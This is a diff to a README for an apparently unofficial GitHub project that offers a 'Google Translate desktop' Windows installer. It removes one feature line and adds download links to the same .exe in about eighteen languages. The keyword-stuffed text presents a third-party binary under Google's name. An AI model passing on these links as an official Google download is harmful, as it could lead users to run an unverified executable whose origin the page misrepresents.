@@ -7,7 +7,6 @@ Google Translate windows is a free multilingual neural machine translation servi
 1.   It capable of:
      - Text translation: Translate between 108 languages by typing
      - Tap to Translate: Copy text in any app and tap the Google Translate icon to translate (all languages)
-     - Offline: Translate with no internet connection (59 languages)
      - Instant camera translation: Translate text in images instantly by just pointing your camera (94 languages)
      - Photos: Take or import photos for higher quality translations (90 languages)
      - Conversations: Translate bilingual conversations on the fly (70 languages)
@@ -29,7 +28,45 @@ What are you waiting for? Hit Download and open up Desktop Translator App on you
 
 To get Google translate desktop for Windows, you can [Download Google translate desktop installer](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe).
 
+ הורד את תוכנית ההתקנה לשולחן העבודה של גוגל תרגום (https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe)[למחשב]
+ 
 [Скачать](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) Google переводчик
+
+[descargar](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) el instalador del traductor de Google para ordenador personal
+
+[Laden](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) Sie das Google Translate-Desktop-Installationsprogramm für den PC herunter
+
+パソコン用のGoogle翻訳デスクトップインストーラーを [ダウンロード](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe)
+
+[download](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) Google vertaler desktop-installatieprogramma voor pc
+
+[baixe](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) o instalador de desktop do Google tradutor para computador pessoal
+
+[télécharger](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) le programme d'installation de bureau du traducteur Google pour ordinateur personnel
+
+kişisel bilgisayar için Google çevirmen masaüstü yükleyicisini [indirin](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe)
+
+[scarica](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) il programma di installazione di Google traduttore per pc
+
+[下载](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) 适用于个人计算机的 Google 翻译桌面安装程序
+
+[قم بتنزيل برنامج تثبيت سطح المكتب من Google Translator للكمبيوتر الشخصي](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe)
+
+[pobierz](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) instalator tłumacza Google na komputer osobisty
+
+[ดาวน์โหลด](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) ตัวติดตั้งเดสก์ท็อป Google นักแปลสำหรับคอมพิวเตอร์ส่วนบุคคล
+
+[ladda](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) ner Google Translator Desktop Installer för persondator
+
+[descărcați](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) programul de instalare desktop Google Translator pentru computer personal
+
+[개인용 컴퓨터용 Google 번역기 데스크톱 설치 프로그램 다운로드](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe)
+
+[unduh](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) penginstal desktop penerjemah Google untuk komputer pribadi
+
+[lataa](https://github.com/AppsForDesktop/Google-translate-desktop/releases/download/1.0.0/Google.translate.desktop.install.exe) Google-kääntäjän työpöytäasennusohjelma henkilökohtaiselle tietokoneelle
+
+
 
 Or you can check the [releases](https://github.com/AppsForDesktop/Google-translate-desktop/releases) page.
 
